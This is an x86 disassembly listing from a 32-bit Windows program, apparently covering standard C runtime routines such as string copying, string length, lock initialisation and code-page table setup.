  42389b:	call   DWORD PTR ds:0x428080
  4238a1:	xor    eax,eax
  4238a3:	ret    
  4238a4:	xor    eax,eax
  4238a6:	inc    eax
  4238a7:	ret    
  4238a8:	push   0x425778
  4238ad:	mov    eax,fs:0x0
  4238b3:	push   eax
  4238b4:	mov    eax,DWORD PTR [esp+0x10]
  4238b8:	mov    DWORD PTR [esp+0x10],ebp
  4238bc:	lea    ebp,[esp+0x10]
  4238c0:	sub    esp,eax
  4238c2:	push   ebx
  4238c3:	push   esi
  4238c4:	push   edi
  4238c5:	mov    eax,DWORD PTR [ebp-0x8]
  4238c8:	mov    DWORD PTR [ebp-0x18],esp
  4238cb:	push   eax
  4238cc:	mov    eax,DWORD PTR [ebp-0x4]
  4238cf:	mov    DWORD PTR [ebp-0x4],0xffffffff
  4238d6:	mov    DWORD PTR [ebp-0x8],eax
  4238d9:	lea    eax,[ebp-0x10]
  4238dc:	mov    fs:0x0,eax
  4238e2:	ret    
  4238e3:	mov    ecx,DWORD PTR [ebp-0x10]
  4238e6:	mov    DWORD PTR fs:0x0,ecx
  4238ed:	pop    ecx
  4238ee:	pop    edi
  4238ef:	pop    esi
  4238f0:	pop    ebx
  4238f1:	leave  
  4238f2:	push   ecx
  4238f3:	ret    
  4238f4:	int3   
  4238f5:	int3   
  4238f6:	int3   
  4238f7:	int3   
  4238f8:	int3   
  4238f9:	int3   
  4238fa:	int3   
  4238fb:	int3   
  4238fc:	int3   
  4238fd:	int3   
  4238fe:	int3   
  4238ff:	int3   
  423900:	cmp    eax,0x1000
  423905:	jae    0x423915
  423907:	neg    eax
  423909:	add    eax,esp
  42390b:	add    eax,0x4
  42390e:	test   DWORD PTR [eax],eax
  423910:	xchg   esp,eax
  423911:	mov    eax,DWORD PTR [eax]
  423913:	push   eax
  423914:	ret    
  423915:	push   ecx
  423916:	lea    ecx,[esp+0x8]
  42391a:	sub    ecx,0x1000
  423920:	sub    eax,0x1000
  423925:	test   DWORD PTR [ecx],eax
  423927:	cmp    eax,0x1000
  42392c:	jae    0x42391a
  42392e:	sub    ecx,eax
  423930:	mov    eax,esp
  423932:	test   DWORD PTR [ecx],eax
  423934:	mov    esp,ecx
  423936:	mov    ecx,DWORD PTR [eax]
  423938:	mov    eax,DWORD PTR [eax+0x4]
  42393b:	push   eax
  42393c:	ret    
  42393d:	push   esi
  42393e:	push   edi
  42393f:	xor    esi,esi
  423941:	mov    edi,0x45cc20
  423946:	cmp    DWORD PTR [esi*8+0x45c314],0x1
  42394e:	jne    0x42396e
  423950:	lea    eax,[esi*8+0x45c310]
  423957:	mov    DWORD PTR [eax],edi
  423959:	push   0xfa0
  42395e:	push   DWORD PTR [eax]
  423960:	add    edi,0x18
  423963:	call   0x42493d
  423968:	test   eax,eax
  42396a:	pop    ecx
  42396b:	pop    ecx
  42396c:	je     0x42397a
  42396e:	inc    esi
  42396f:	cmp    esi,0x24
  423972:	jl     0x423946
  423974:	xor    eax,eax
  423976:	inc    eax
  423977:	pop    edi
  423978:	pop    esi
  423979:	ret    
  42397a:	and    DWORD PTR [esi*8+0x45c310],0x0
  423982:	xor    eax,eax
  423984:	jmp    0x423977
  423986:	push   ebx
  423987:	mov    ebx,DWORD PTR ds:0x428064
  42398d:	push   esi
  42398e:	mov    esi,0x45c310
  423993:	push   edi
  423994:	mov    edi,DWORD PTR [esi]
  423996:	test   edi,edi
  423998:	je     0x4239ad
  42399a:	cmp    DWORD PTR [esi+0x4],0x1
  42399e:	je     0x4239ad
  4239a0:	push   edi
  4239a1:	call   ebx
  4239a3:	push   edi
  4239a4:	call   0x4244ba
  4239a9:	and    DWORD PTR [esi],0x0
  4239ac:	pop    ecx
  4239ad:	add    esi,0x8
  4239b0:	cmp    esi,0x45c430
  4239b6:	jl     0x423994
  4239b8:	mov    esi,0x45c310
  4239bd:	pop    edi
  4239be:	mov    eax,DWORD PTR [esi]
  4239c0:	test   eax,eax
  4239c2:	je     0x4239cd
  4239c4:	cmp    DWORD PTR [esi+0x4],0x1
  4239c8:	jne    0x4239cd
  4239ca:	push   eax
  4239cb:	call   ebx
  4239cd:	add    esi,0x8
  4239d0:	cmp    esi,0x45c430
  4239d6:	jl     0x4239be
  4239d8:	pop    esi
  4239d9:	pop    ebx
  4239da:	ret    
  4239db:	push   ebp
  4239dc:	mov    ebp,esp
  4239de:	mov    eax,DWORD PTR [ebp+0x8]
  4239e1:	push   DWORD PTR [eax*8+0x45c310]
  4239e8:	call   DWORD PTR ds:0x428090
  4239ee:	pop    ebp
  4239ef:	ret    
  4239f0:	push   ebp
  4239f1:	mov    ebp,esp
  4239f3:	push   esi
  4239f4:	mov    esi,DWORD PTR [ebp+0x8]
  4239f7:	lea    esi,[esi*8+0x45c310]
  4239fe:	cmp    DWORD PTR [esi],0x0
  423a01:	je     0x423a08
  423a03:	xor    eax,eax
  423a05:	inc    eax
  423a06:	jmp    0x423a6c
  423a08:	push   edi
  423a09:	push   0x18
  423a0b:	call   0x4245d2
  423a10:	mov    edi,eax
  423a12:	test   edi,edi
  423a14:	pop    ecx
  423a15:	jne    0x423a26
  423a17:	call   0x425850
  423a1c:	mov    DWORD PTR [eax],0xc
  423a22:	xor    eax,eax
  423a24:	jmp    0x423a6b
  423a26:	push   0xa
  423a28:	call   0x423a6f
  423a2d:	cmp    DWORD PTR [esi],0x0
  423a30:	pop    ecx
  423a31:	jne    0x423a59
  423a33:	push   0xfa0
  423a38:	push   edi
  423a39:	call   0x42493d
  423a3e:	test   eax,eax
  423a40:	pop    ecx
  423a41:	pop    ecx
  423a42:	jne    0x423a55
  423a44:	push   edi
  423a45:	call   0x4244ba
  423a4a:	push   0xa
  423a4c:	call   0x4239db
  423a51:	pop    ecx
  423a52:	pop    ecx
  423a53:	jmp    0x423a17
  423a55:	mov    DWORD PTR [esi],edi
  423a57:	jmp    0x423a60
  423a59:	push   edi
  423a5a:	call   0x4244ba
  423a5f:	pop    ecx
  423a60:	push   0xa
  423a62:	call   0x4239db
  423a67:	xor    eax,eax
  423a69:	pop    ecx
  423a6a:	inc    eax
  423a6b:	pop    edi
  423a6c:	pop    esi
  423a6d:	pop    ebp
  423a6e:	ret    
  423a6f:	push   ebp
  423a70:	mov    ebp,esp
  423a72:	mov    eax,DWORD PTR [ebp+0x8]
  423a75:	push   esi
  423a76:	lea    esi,[eax*8+0x45c310]
  423a7d:	cmp    DWORD PTR [esi],0x0
  423a80:	jne    0x423a95
  423a82:	push   eax
  423a83:	call   0x4239f0
  423a88:	test   eax,eax
  423a8a:	pop    ecx
  423a8b:	jne    0x423a95
  423a8d:	push   0x11
  423a8f:	call   0x422970
  423a94:	pop    ecx
  423a95:	push   DWORD PTR [esi]
  423a97:	call   DWORD PTR ds:0x428094
  423a9d:	pop    esi
  423a9e:	pop    ebp
  423a9f:	ret    
  423aa0:	push   esi
  423aa1:	push   DWORD PTR ds:0x45d268
  423aa7:	call   0x425a06
  423aac:	pop    ecx
  423aad:	mov    ecx,DWORD PTR ds:0x45d264
  423ab3:	mov    esi,eax
  423ab5:	mov    eax,ds:0x45d268
  423aba:	mov    edx,ecx
  423abc:	sub    edx,eax
  423abe:	add    edx,0x4
  423ac1:	cmp    esi,edx
  423ac3:	jae    0x423b13
  423ac5:	mov    ecx,0x800
  423aca:	cmp    esi,ecx
  423acc:	jae    0x423ad0
  423ace:	mov    ecx,esi
  423ad0:	add    ecx,esi
  423ad2:	push   ecx
  423ad3:	push   eax
  423ad4:	call   0x425859
  423ad9:	test   eax,eax
  423adb:	pop    ecx
  423adc:	pop    ecx
  423add:	jne    0x423af6
  423adf:	add    esi,0x10
  423ae2:	push   esi
  423ae3:	push   DWORD PTR ds:0x45d268
  423ae9:	call   0x425859
  423aee:	test   eax,eax
  423af0:	pop    ecx
  423af1:	pop    ecx
  423af2:	jne    0x423af6
  423af4:	pop    esi
  423af5:	ret    
  423af6:	mov    ecx,DWORD PTR ds:0x45d264
  423afc:	sub    ecx,DWORD PTR ds:0x45d268
  423b02:	mov    ds:0x45d268,eax
  423b07:	sar    ecx,0x2
  423b0a:	lea    ecx,[eax+ecx*4]
  423b0d:	mov    DWORD PTR ds:0x45d264,ecx
  423b13:	mov    DWORD PTR [ecx],edi
  423b15:	add    DWORD PTR ds:0x45d264,0x4
  423b1c:	mov    eax,edi
  423b1e:	pop    esi
  423b1f:	ret    
  423b20:	push   0x80
  423b25:	call   0x4245d2
  423b2a:	test   eax,eax
  423b2c:	pop    ecx
  423b2d:	mov    ds:0x45d268,eax
  423b32:	jne    0x423b38
  423b34:	push   0x18
  423b36:	pop    eax
  423b37:	ret    
  423b38:	and    DWORD PTR [eax],0x0
  423b3b:	mov    eax,ds:0x45d268
  423b40:	mov    ds:0x45d264,eax
  423b45:	xor    eax,eax
  423b47:	ret    
  423b48:	push   0xc
  423b4a:	push   0x4284c8
  423b4f:	call   0x4238a8
  423b54:	call   0x422bbb
  423b59:	and    DWORD PTR [ebp-0x4],0x0
  423b5d:	mov    edi,DWORD PTR [ebp+0x8]
  423b60:	call   0x423aa0
  423b65:	mov    DWORD PTR [ebp-0x1c],eax
  423b68:	or     DWORD PTR [ebp-0x4],0xffffffff
  423b6c:	call   0x423b7a
  423b71:	mov    eax,DWORD PTR [ebp-0x1c]
  423b74:	call   0x4238e3
  423b79:	ret    
  423b7a:	call   0x422bc4
  423b7f:	ret    
  423b80:	push   DWORD PTR [esp+0x4]
  423b84:	call   0x423b48
  423b89:	neg    eax
  423b8b:	sbb    eax,eax
  423b8d:	neg    eax
  423b8f:	pop    ecx
  423b90:	dec    eax
  423b91:	ret    
  423b92:	push   ebp
  423b93:	mov    ebp,esp
  423b95:	sub    esp,0x10
  423b98:	push   ebx
  423b99:	xor    ebx,ebx
  423b9b:	cmp    DWORD PTR ds:0x45cd70,ebx
  423ba1:	push   esi
  423ba2:	push   edi
  423ba3:	jne    0x423c12
  423ba5:	push   0x428538
  423baa:	call   DWORD PTR ds:0x428098
  423bb0:	mov    edi,eax
  423bb2:	cmp    edi,ebx
  423bb4:	je     0x423c4d
  423bba:	mov    esi,DWORD PTR ds:0x42801c
  423bc0:	push   0x42852c
  423bc5:	push   edi
  423bc6:	call   esi
  423bc8:	test   eax,eax
  423bca:	mov    ds:0x45cd70,eax
  423bcf:	je     0x423c4d
  423bd1:	push   0x42851c
  423bd6:	push   edi
  423bd7:	call   esi
  423bd9:	push   0x428508
  423bde:	push   edi
  423bdf:	mov    ds:0x45cd74,eax
  423be4:	call   esi
  423be6:	cmp    DWORD PTR ds:0x45cac4,0x2
  423bed:	mov    ds:0x45cd78,eax
  423bf2:	jne    0x423c12
  423bf4:	push   0x4284ec
  423bf9:	push   edi
  423bfa:	call   esi
  423bfc:	test   eax,eax
  423bfe:	mov    ds:0x45cd80,eax
  423c03:	je     0x423c12
  423c05:	push   0x4284d4
  423c0a:	push   edi
  423c0b:	call   esi
  423c0d:	mov    ds:0x45cd7c,eax
  423c12:	mov    eax,ds:0x45cd7c
  423c17:	test   eax,eax
  423c19:	je     0x423c57
  423c1b:	call   eax
  423c1d:	test   eax,eax
  423c1f:	je     0x423c3e
  423c21:	lea    ecx,[ebp-0x4]
  423c24:	push   ecx
  423c25:	push   0xc
  423c27:	lea    ecx,[ebp-0x10]
  423c2a:	push   ecx
  423c2b:	push   0x1
  423c2d:	push   eax
  423c2e:	call   DWORD PTR ds:0x45cd80
  423c34:	test   eax,eax
  423c36:	je     0x423c3e
  423c38:	test   BYTE PTR [ebp-0x8],0x1
  423c3c:	jne    0x423c57
  423c3e:	cmp    DWORD PTR ds:0x45cad0,0x4
  423c45:	jb     0x423c51
  423c47:	or     BYTE PTR [ebp+0x12],0x20
  423c4b:	jmp    0x423c76
  423c4d:	xor    eax,eax
  423c4f:	jmp    0x423c86
  423c51:	or     BYTE PTR [ebp+0x12],0x4
  423c55:	jmp    0x423c76
  423c57:	mov    eax,ds:0x45cd74
  423c5c:	test   eax,eax
  423c5e:	je     0x423c76
  423c60:	call   eax
  423c62:	mov    ebx,eax
  423c64:	test   ebx,ebx
  423c66:	je     0x423c76
  423c68:	mov    eax,ds:0x45cd78
  423c6d:	test   eax,eax
  423c6f:	je     0x423c76
  423c71:	push   ebx
  423c72:	call   eax
  423c74:	mov    ebx,eax
  423c76:	push   DWORD PTR [ebp+0x10]
  423c79:	push   DWORD PTR [ebp+0xc]
  423c7c:	push   DWORD PTR [ebp+0x8]
  423c7f:	push   ebx
  423c80:	call   DWORD PTR ds:0x45cd70
  423c86:	pop    edi
  423c87:	pop    esi
  423c88:	pop    ebx
  423c89:	leave  
  423c8a:	ret    
  423c8b:	int3   
  423c8c:	int3   
  423c8d:	int3   
  423c8e:	int3   
  423c8f:	int3   
  423c90:	push   edi
  423c91:	mov    edi,DWORD PTR [esp+0x8]
  423c95:	jmp    0x423d05
  423c97:	lea    esp,[esp+0x0]
  423c9e:	mov    edi,edi
  423ca0:	mov    ecx,DWORD PTR [esp+0x4]
  423ca4:	push   edi
  423ca5:	test   ecx,0x3
  423cab:	je     0x423cc0
  423cad:	mov    al,BYTE PTR [ecx]
  423caf:	add    ecx,0x1
  423cb2:	test   al,al
  423cb4:	je     0x423cf3
  423cb6:	test   ecx,0x3
  423cbc:	jne    0x423cad
  423cbe:	mov    edi,edi
  423cc0:	mov    eax,DWORD PTR [ecx]
  423cc2:	mov    edx,0x7efefeff
  423cc7:	add    edx,eax
  423cc9:	xor    eax,0xffffffff
  423ccc:	xor    eax,edx
  423cce:	add    ecx,0x4
  423cd1:	test   eax,0x81010100
  423cd6:	je     0x423cc0
  423cd8:	mov    eax,DWORD PTR [ecx-0x4]
  423cdb:	test   al,al
  423cdd:	je     0x423d02
  423cdf:	test   ah,ah
  423ce1:	je     0x423cfd
  423ce3:	test   eax,0xff0000
  423ce8:	je     0x423cf8
  423cea:	test   eax,0xff000000
  423cef:	je     0x423cf3
  423cf1:	jmp    0x423cc0
  423cf3:	lea    edi,[ecx-0x1]
  423cf6:	jmp    0x423d05
  423cf8:	lea    edi,[ecx-0x2]
  423cfb:	jmp    0x423d05
  423cfd:	lea    edi,[ecx-0x3]
  423d00:	jmp    0x423d05
  423d02:	lea    edi,[ecx-0x4]
  423d05:	mov    ecx,DWORD PTR [esp+0xc]
  423d09:	test   ecx,0x3
  423d0f:	je     0x423d2e
  423d11:	mov    dl,BYTE PTR [ecx]
  423d13:	add    ecx,0x1
  423d16:	test   dl,dl
  423d18:	je     0x423d80
  423d1a:	mov    BYTE PTR [edi],dl
  423d1c:	add    edi,0x1
  423d1f:	test   ecx,0x3
  423d25:	jne    0x423d11
  423d27:	jmp    0x423d2e
  423d29:	mov    DWORD PTR [edi],edx
  423d2b:	add    edi,0x4
  423d2e:	mov    edx,0x7efefeff
  423d33:	mov    eax,DWORD PTR [ecx]
  423d35:	add    edx,eax
  423d37:	xor    eax,0xffffffff
  423d3a:	xor    eax,edx
  423d3c:	mov    edx,DWORD PTR [ecx]
  423d3e:	add    ecx,0x4
  423d41:	test   eax,0x81010100
  423d46:	je     0x423d29
  423d48:	test   dl,dl
  423d4a:	je     0x423d80
  423d4c:	test   dh,dh
  423d4e:	je     0x423d77
  423d50:	test   edx,0xff0000
  423d56:	je     0x423d6a
  423d58:	test   edx,0xff000000
  423d5e:	je     0x423d62
  423d60:	jmp    0x423d29
  423d62:	mov    DWORD PTR [edi],edx
  423d64:	mov    eax,DWORD PTR [esp+0x8]
  423d68:	pop    edi
  423d69:	ret    
  423d6a:	mov    WORD PTR [edi],dx
  423d6d:	mov    eax,DWORD PTR [esp+0x8]
  423d71:	mov    BYTE PTR [edi+0x2],0x0
  423d75:	pop    edi
  423d76:	ret    
  423d77:	mov    WORD PTR [edi],dx
  423d7a:	mov    eax,DWORD PTR [esp+0x8]
  423d7e:	pop    edi
  423d7f:	ret    
  423d80:	mov    BYTE PTR [edi],dl
  423d82:	mov    eax,DWORD PTR [esp+0x8]
  423d86:	pop    edi
  423d87:	ret    
  423d88:	int3   
  423d89:	int3   
  423d8a:	int3   
  423d8b:	int3   
  423d8c:	int3   
  423d8d:	int3   
  423d8e:	int3   
  423d8f:	int3   
  423d90:	mov    ecx,DWORD PTR [esp+0xc]
  423d94:	push   edi
  423d95:	test   ecx,ecx
  423d97:	je     0x423e2f
  423d9d:	push   esi
  423d9e:	push   ebx
  423d9f:	mov    ebx,ecx
  423da1:	mov    esi,DWORD PTR [esp+0x14]
  423da5:	test   esi,0x3
  423dab:	mov    edi,DWORD PTR [esp+0x10]
  423daf:	jne    0x423dbc
  423db1:	shr    ecx,0x2
  423db4:	jne    0x423e3f
  423dba:	jmp    0x423de3
  423dbc:	mov    al,BYTE PTR [esi]
  423dbe:	add    esi,0x1
  423dc1:	mov    BYTE PTR [edi],al
  423dc3:	add    edi,0x1
  423dc6:	sub    ecx,0x1
  423dc9:	je     0x423df6
  423dcb:	test   al,al
  423dcd:	je     0x423dfe
  423dcf:	test   esi,0x3
  423dd5:	jne    0x423dbc
  423dd7:	mov    ebx,ecx
  423dd9:	shr    ecx,0x2
  423ddc:	jne    0x423e3f
  423dde:	and    ebx,0x3
  423de1:	je     0x423df6
  423de3:	mov    al,BYTE PTR [esi]
  423de5:	add    esi,0x1
  423de8:	mov    BYTE PTR [edi],al
  423dea:	add    edi,0x1
  423ded:	test   al,al
  423def:	je     0x423e28
  423df1:	sub    ebx,0x1
  423df4:	jne    0x423de3
  423df6:	mov    eax,DWORD PTR [esp+0x10]
  423dfa:	pop    ebx
  423dfb:	pop    esi
  423dfc:	pop    edi
  423dfd:	ret    
  423dfe:	test   edi,0x3
  423e04:	je     0x423e1c
  423e06:	mov    BYTE PTR [edi],al
  423e08:	add    edi,0x1
  423e0b:	sub    ecx,0x1
  423e0e:	je     0x423eac
  423e14:	test   edi,0x3
  423e1a:	jne    0x423e06
  423e1c:	mov    ebx,ecx
  423e1e:	shr    ecx,0x2
  423e21:	jne    0x423e97
  423e23:	mov    BYTE PTR [edi],al
  423e25:	add    edi,0x1
  423e28:	sub    ebx,0x1
  423e2b:	jne    0x423e23
  423e2d:	pop    ebx
  423e2e:	pop    esi
  423e2f:	mov    eax,DWORD PTR [esp+0x8]
  423e33:	pop    edi
  423e34:	ret    
  423e35:	mov    DWORD PTR [edi],edx
  423e37:	add    edi,0x4
  423e3a:	sub    ecx,0x1
  423e3d:	je     0x423dde
  423e3f:	mov    edx,0x7efefeff
  423e44:	mov    eax,DWORD PTR [esi]
  423e46:	add    edx,eax
  423e48:	xor    eax,0xffffffff
  423e4b:	xor    eax,edx
  423e4d:	mov    edx,DWORD PTR [esi]
  423e4f:	add    esi,0x4
  423e52:	test   eax,0x81010100
  423e57:	je     0x423e35
  423e59:	test   dl,dl
  423e5b:	je     0x423e89
  423e5d:	test   dh,dh
  423e5f:	je     0x423e7f
  423e61:	test   edx,0xff0000
  423e67:	je     0x423e75
  423e69:	test   edx,0xff000000
  423e6f:	jne    0x423e35
  423e71:	mov    DWORD PTR [edi],edx
  423e73:	jmp    0x423e8d
  423e75:	and    edx,0xffff
  423e7b:	mov    DWORD PTR [edi],edx
  423e7d:	jmp    0x423e8d
  423e7f:	and    edx,0xff
  423e85:	mov    DWORD PTR [edi],edx
  423e87:	jmp    0x423e8d
  423e89:	xor    edx,edx
  423e8b:	mov    DWORD PTR [edi],edx
  423e8d:	add    edi,0x4
  423e90:	xor    eax,eax
  423e92:	sub    ecx,0x1
  423e95:	je     0x423ea3
  423e97:	xor    eax,eax
  423e99:	mov    DWORD PTR [edi],eax
  423e9b:	add    edi,0x4
  423e9e:	sub    ecx,0x1
  423ea1:	jne    0x423e99
  423ea3:	and    ebx,0x3
  423ea6:	jne    0x423e23
  423eac:	mov    eax,DWORD PTR [esp+0x10]
  423eb0:	pop    ebx
  423eb1:	pop    esi
  423eb2:	pop    edi
  423eb3:	ret    
  423eb4:	int3   
  423eb5:	int3   
  423eb6:	int3   
  423eb7:	int3   
  423eb8:	int3   
  423eb9:	int3   
  423eba:	int3   
  423ebb:	int3   
  423ebc:	int3   
  423ebd:	int3   
  423ebe:	int3   
  423ebf:	int3   
  423ec0:	mov    ecx,DWORD PTR [esp+0x4]
  423ec4:	test   ecx,0x3
  423eca:	je     0x423ef0
  423ecc:	mov    al,BYTE PTR [ecx]
  423ece:	add    ecx,0x1
  423ed1:	test   al,al
  423ed3:	je     0x423f23
  423ed5:	test   ecx,0x3
  423edb:	jne    0x423ecc
  423edd:	add    eax,0x0
  423ee2:	lea    esp,[esp+0x0]
  423ee9:	lea    esp,[esp+0x0]
  423ef0:	mov    eax,DWORD PTR [ecx]
  423ef2:	mov    edx,0x7efefeff
  423ef7:	add    edx,eax
  423ef9:	xor    eax,0xffffffff
  423efc:	xor    eax,edx
  423efe:	add    ecx,0x4
  423f01:	test   eax,0x81010100
  423f06:	je     0x423ef0
  423f08:	mov    eax,DWORD PTR [ecx-0x4]
  423f0b:	test   al,al
  423f0d:	je     0x423f41
  423f0f:	test   ah,ah
  423f11:	je     0x423f37
  423f13:	test   eax,0xff0000
  423f18:	je     0x423f2d
  423f1a:	test   eax,0xff000000
  423f1f:	je     0x423f23
  423f21:	jmp    0x423ef0
  423f23:	lea    eax,[ecx-0x1]
  423f26:	mov    ecx,DWORD PTR [esp+0x4]
  423f2a:	sub    eax,ecx
  423f2c:	ret    
  423f2d:	lea    eax,[ecx-0x2]
  423f30:	mov    ecx,DWORD PTR [esp+0x4]
  423f34:	sub    eax,ecx
  423f36:	ret    
  423f37:	lea    eax,[ecx-0x3]
  423f3a:	mov    ecx,DWORD PTR [esp+0x4]
  423f3e:	sub    eax,ecx
  423f40:	ret    
  423f41:	lea    eax,[ecx-0x4]
  423f44:	mov    ecx,DWORD PTR [esp+0x4]
  423f48:	sub    eax,ecx
  423f4a:	ret    
  423f4b:	push   0x8
  423f4d:	push   0x428548
  423f52:	call   0x4238a8
  423f57:	and    DWORD PTR [ebp-0x4],0x0
  423f5b:	push   0x0
  423f5d:	push   0x1
  423f5f:	call   0x425ad2
  423f64:	pop    ecx
  423f65:	pop    ecx
  423f66:	jmp    0x423f6f
  423f68:	xor    eax,eax
  423f6a:	inc    eax
  423f6b:	ret    
  423f6c:	mov    esp,DWORD PTR [ebp-0x18]
  423f6f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423f73:	push   0x3
  423f75:	call   DWORD PTR ds:0x42802c
  423f7b:	int3   
  423f7c:	cmp    ecx,DWORD PTR ds:0x45c430
  423f82:	jne    0x423f85
  423f84:	ret    
  423f85:	jmp    0x423f4b
  423f8a:	movzx  eax,BYTE PTR [esp+0x4]
  423f8f:	mov    cl,BYTE PTR [esp+0xc]
  423f93:	test   BYTE PTR [eax+0x45cf21],cl
  423f99:	jne    0x423fb7
  423f9b:	cmp    DWORD PTR [esp+0x8],0x0
  423fa0:	je     0x423fb0
  423fa2:	movzx  eax,WORD PTR [eax*2+0x428942]
  423faa:	and    eax,DWORD PTR [esp+0x8]
  423fae:	jmp    0x423fb2
  423fb0:	xor    eax,eax
  423fb2:	test   eax,eax
  423fb4:	jne    0x423fb7
  423fb6:	ret    
  423fb7:	xor    eax,eax
  423fb9:	inc    eax
  423fba:	ret    
  423fbb:	push   0x4
  423fbd:	push   0x0
  423fbf:	push   DWORD PTR [esp+0xc]
  423fc3:	call   0x423f8a
  423fc8:	add    esp,0xc
  423fcb:	ret    
  423fcc:	sub    eax,0x3a4
  423fd1:	je     0x423ff5
  423fd3:	sub    eax,0x4
  423fd6:	je     0x423fef
  423fd8:	sub    eax,0xd
  423fdb:	je     0x423fe9
  423fdd:	dec    eax
  423fde:	je     0x423fe3
  423fe0:	xor    eax,eax
  423fe2:	ret    
  423fe3:	mov    eax,0x404
  423fe8:	ret    
  423fe9:	mov    eax,0x412
  423fee:	ret    
  423fef:	mov    eax,0x804
  423ff4:	ret    
  423ff5:	mov    eax,0x411
  423ffa:	ret    
  423ffb:	push   edi
  423ffc:	push   0x40
  423ffe:	xor    eax,eax
  424000:	pop    ecx
  424001:	mov    edi,0x45cf20
  424006:	rep stos DWORD PTR es:[edi],eax
  424008:	stos   BYTE PTR es:[edi],al
  424009:	xor    eax,eax
  42400b:	mov    ds:0x45d024,eax
  424010:	mov    ds:0x45cf1c,eax
  424015:	mov    ds:0x45cf14,eax
  42401a:	mov    edi,0x45d030
  42401f:	stos   DWORD PTR es:[edi],eax
  424020:	stos   DWORD PTR es:[edi],eax
  424021:	stos   DWORD PTR es:[edi],eax
  424022:	pop    edi
  424023:	ret    
  424024:	push   ebp
  424025:	mov    ebp,esp
  424027:	sub    esp,0x518
  42402d:	mov    eax,ds:0x45c430
  424032:	xor    eax,DWORD PTR [ebp+0x4]
  424035:	push   esi
  424036:	mov    DWORD PTR [ebp-0x4],eax
  424039:	lea    eax,[ebp-0x18]
  42403c:	push   eax
  42403d:	push   DWORD PTR ds:0x45d024
  424043:	call   DWORD PTR ds:0x4280a4
  424049:	cmp    eax,0x1
  42404c:	mov    esi,0x100
  424051:	jne    0x424164
  424057:	xor    eax,eax
  424059:	mov    BYTE PTR [ebp+eax*1-0x118],al
  424060:	inc    eax
  424061:	cmp    eax,esi
  424063:	jb     0x424059
  424065:	mov    al,BYTE PTR [ebp-0x12]
  424068:	test   al,al
  42406a:	mov    BYTE PTR [ebp-0x118],0x20
  424071:	je     0x4240a9
  424073:	push   ebx
  424074:	lea    edx,[ebp-0x11]
  424077:	push   edi
  424078:	movzx  ecx,BYTE PTR [edx]
  42407b:	movzx  eax,al
  42407e:	cmp    eax,ecx
  424080:	ja     0x42409f
  424082:	sub    ecx,eax
  424084:	inc    ecx
  424085:	mov    ebx,ecx
  424087:	shr    ecx,0x2
  42408a:	lea    edi,[ebp+eax*1-0x118]
  424091:	mov    eax,0x20202020
  424096:	rep stos DWORD PTR es:[edi],eax
  424098:	mov    ecx,ebx
  42409a:	and    ecx,0x3
  42409d:	rep stos BYTE PTR es:[edi],al
  42409f:	inc    edx
  4240a0:	mov    al,BYTE PTR [edx]
  4240a2:	inc    edx
  4240a3:	test   al,al
  4240a5:	jne    0x424078
  4240a7:	pop    edi
  4240a8:	pop    ebx
  4240a9:	push   0x0
  4240ab:	push   DWORD PTR ds:0x45cf14
  4240b1:	lea    eax,[ebp-0x518]
  4240b7:	push   DWORD PTR ds:0x45d024
  4240bd:	push   eax
  4240be:	push   esi
  4240bf:	lea    eax,[ebp-0x118]
  4240c5:	push   eax
  4240c6:	push   0x1
  4240c8:	call   0x425fd8
  4240cd:	push   0x0
  4240cf:	push   DWORD PTR ds:0x45d024
  4240d5:	lea    eax,[ebp-0x218]
  4240db:	push   esi
  4240dc:	push   eax
  4240dd:	push   esi
  4240de:	lea    eax,[ebp-0x118]
  4240e4:	push   eax
  4240e5:	push   esi
  4240e6:	push   DWORD PTR ds:0x45cf14
  4240ec:	call   0x425c1c
  4240f1:	push   0x0
  4240f3:	push   DWORD PTR ds:0x45d024
  4240f9:	lea    eax,[ebp-0x318]
  4240ff:	push   esi
  424100:	push   eax
  424101:	push   esi
  424102:	lea    eax,[ebp-0x118]
  424108:	push   eax
  424109:	push   0x200
  42410e:	push   DWORD PTR ds:0x45cf14
  424114:	call   0x425c1c
  424119:	add    esp,0x5c
  42411c:	xor    eax,eax
  42411e:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  424126:	test   cl,0x1
  424129:	je     0x424141
  42412b:	or     BYTE PTR [eax+0x45cf21],0x10
  424132:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  424139:	mov    BYTE PTR [eax+0x45d040],cl
  42413f:	jmp    0x42415d
  424141:	test   cl,0x2
  424144:	je     0x424156
  424146:	or     BYTE PTR [eax+0x45cf21],0x20
  42414d:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  424154:	jmp    0x424139
  424156:	and    BYTE PTR [eax+0x45d040],0x0
  42415d:	inc    eax
  42415e:	cmp    eax,esi
  424160:	jb     0x42411e
  424162:	jmp    0x4241a8
  424164:	xor    eax,eax
  424166:	cmp    eax,0x41
  424169:	jb     0x424184
  42416b:	cmp    eax,0x5a
  42416e:	ja     0x424184
  424170:	or     BYTE PTR [eax+0x45cf21],0x10
  424177:	mov    cl,al
  424179:	add    cl,0x20
  42417c:	mov    BYTE PTR [eax+0x45d040],cl
  424182:	jmp    0x4241a3
  424184:	cmp    eax,0x61
  424187:	jb     0x42419c
  424189:	cmp    eax,0x7a
  42418c:	ja     0x42419c
  42418e:	or     BYTE PTR [eax+0x45cf21],0x20
  424195:	mov    cl,al
  424197:	sub    cl,0x20
  42419a:	jmp    0x42417c
  42419c:	and    BYTE PTR [eax+0x45d040],0x0
  4241a3:	inc    eax
  4241a4:	cmp    eax,esi
  4241a6:	jb     0x424166
  4241a8:	mov    ecx,DWORD PTR [ebp-0x4]
  4241ab:	xor    ecx,DWORD PTR [ebp+0x4]
  4241ae:	pop    esi
  4241af:	call   0x423f7c
  4241b4:	leave  
  4241b5:	ret    
  4241b6:	push   ebp
  4241b7:	mov    ebp,esp
  4241b9:	sub    esp,0x1c
  4241bc:	mov    eax,ds:0x45c430
  4241c1:	xor    eax,DWORD PTR [ebp+0x4]
  4241c4:	push   ebx
  4241c5:	push   esi
  4241c6:	mov    esi,DWORD PTR [ebp+0x8]
  4241c9:	xor    ebx,ebx
  4241cb:	cmp    esi,ebx
  4241cd:	mov    DWORD PTR [ebp-0x4],eax
  4241d0:	push   edi
  4241d1:	je     0x42432b
  4241d7:	xor    edx,edx
  4241d9:	xor    eax,eax
  4241db:	cmp    DWORD PTR [eax+0x45c440],esi
  4241e1:	je     0x424248
  4241e3:	add    eax,0x30
  4241e6:	inc    edx
  4241e7:	cmp    eax,0xf0
  4241ec:	jb     0x4241db
  4241ee:	lea    eax,[ebp-0x1c]
  4241f1:	push   eax
